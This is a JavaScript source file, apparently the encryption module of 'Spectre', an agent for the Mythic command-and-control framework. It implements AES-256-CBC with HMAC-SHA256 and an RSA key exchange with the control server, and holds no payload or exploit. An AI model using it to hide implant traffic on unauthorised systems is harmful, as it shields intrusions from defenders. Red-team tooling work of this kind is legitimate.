// ============================================================
// Spectre - AES-256 Encryption
// Mythic protocol encryption: AES-256-CBC + HMAC-SHA256
// ============================================================

const SpectreCrypto = {
    _crypto: null,
    _psk: null, // Pre-shared key (base64-encoded 32 bytes)
    _sessionKey: null,

    /**
     * Initialize crypto module.
     */
    init: function(psk) {
        this._crypto = require('crypto');
        if (psk) {
            this._psk = Buffer.from(psk, 'base64');
            this._sessionKey = this._psk;
        }
    },

    /**
     * Set the session encryption key (after key exchange).
     */
    setSessionKey: function(key) {
        if (typeof key === 'string') {
            this._sessionKey = Buffer.from(key, 'base64');
        } else {
            this._sessionKey = key;
        }
    },

    /**
     * Generate a new random AES-256 key.
     */
    generateKey: function() {
        return this._crypto.randomBytes(32);
    },

    /**
     * Generate a new RSA key pair for key exchange.
     */
    generateRSAKeyPair: function() {
        const { publicKey, privateKey } = this._crypto.generateKeyPairSync('rsa', {
            modulusLength: 4096,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
        });
        return { publicKey, privateKey };
    },

    /**
     * RSA encrypt data with the server's public key.
     */
    rsaEncrypt: function(data, publicKeyPem) {
        return this._crypto.publicEncrypt(
            {
                key: publicKeyPem,
                padding: this._crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: 'sha256',
            },
            Buffer.isBuffer(data) ? data : Buffer.from(data)
        );
    },

    /**
     * RSA decrypt data with our private key.
     */
    rsaDecrypt: function(data, privateKeyPem) {
        return this._crypto.privateDecrypt(
            {
                key: privateKeyPem,
                padding: this._crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: 'sha256',
            },
            Buffer.isBuffer(data) ? data : Buffer.from(data)
        );
    },

    /**
     * Encrypt data using AES-256-CBC with HMAC-SHA256.
     *
     * Format: IV (16 bytes) || ciphertext || HMAC (32 bytes)
     * All base64-encoded for transit.
     */
    encrypt: function(plaintext) {
        if (!this._sessionKey) {
            throw new Error('No encryption key set');
        }

        const iv = this._crypto.randomBytes(16);
        const cipher = this._crypto.createCipheriv('aes-256-cbc', this._sessionKey, iv);

        let plaintextBuf;
        if (typeof plaintext === 'string') {
            plaintextBuf = Buffer.from(plaintext, 'utf-8');
        } else if (Buffer.isBuffer(plaintext)) {
            plaintextBuf = plaintext;
        } else {
            plaintextBuf = Buffer.from(JSON.stringify(plaintext), 'utf-8');
        }

        const encrypted = Buffer.concat([cipher.update(plaintextBuf), cipher.final()]);

        // IV + ciphertext
        const ivAndCiphertext = Buffer.concat([iv, encrypted]);

        // HMAC over IV + ciphertext
        const hmac = this._crypto.createHmac('sha256', this._sessionKey);
        hmac.update(ivAndCiphertext);
        const hmacDigest = hmac.digest();

        // Final format: base64(IV + ciphertext + HMAC)
        return Buffer.concat([ivAndCiphertext, hmacDigest]).toString('base64');
    },

    /**
     * Decrypt AES-256-CBC data with HMAC-SHA256 verification.
     */
    decrypt: function(encryptedB64) {
        if (!this._sessionKey) {
            throw new Error('No encryption key set');
        }

        const raw = Buffer.from(encryptedB64, 'base64');

        // Extract HMAC (last 32 bytes)
        const hmacReceived = raw.slice(raw.length - 32);
        const ivAndCiphertext = raw.slice(0, raw.length - 32);

        // Verify HMAC
        const hmac = this._crypto.createHmac('sha256', this._sessionKey);
        hmac.update(ivAndCiphertext);
        const hmacComputed = hmac.digest();

        if (!this._crypto.timingSafeEqual(hmacReceived, hmacComputed)) {
            throw new Error('HMAC verification failed');
        }

        // Extract IV (first 16 bytes) and ciphertext
        const iv = ivAndCiphertext.slice(0, 16);
        const ciphertext = ivAndCiphertext.slice(16);

        const decipher = this._crypto.createDecipheriv('aes-256-cbc', this._sessionKey, iv);
        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);

        return decrypted.toString('utf-8');
    },

    /**
     * Perform the Mythic encrypted key exchange (EKE).
     *
     * 1. Generate RSA key pair
     * 2. Send base64(UUID + RSA_public_key) to Mythic
     * 3. Mythic responds with RSA_encrypt(AES_session_key + UUID)
     * 4. Decrypt to get session key
     */
    prepareKeyExchange: function() {
        const keyPair = this.generateRSAKeyPair();
        this._rsaPrivateKey = keyPair.privateKey;

        // Extract just the base64 portion of the PEM
        const pubKeyB64 = keyPair.publicKey
            .replace('-----BEGIN PUBLIC KEY-----', '')
            .replace('-----END PUBLIC KEY-----', '')
            .replace(/\n/g, '');

        return pubKeyB64;
    },

    /**
     * Complete the key exchange by decrypting the server's response.
     */
    completeKeyExchange: function(encryptedResponse) {
        const decrypted = this.rsaDecrypt(
            Buffer.from(encryptedResponse, 'base64'),
            this._rsaPrivateKey
        );

        // Server sends: AES_key (32 bytes) + UUID
        const sessionKey = decrypted.slice(0, 32);
        const newUUID = decrypted.slice(32).toString('utf-8');

        this.setSessionKey(sessionKey);
        this._rsaPrivateKey = null; // Clean up

        return { sessionKey, newUUID };
    }
};
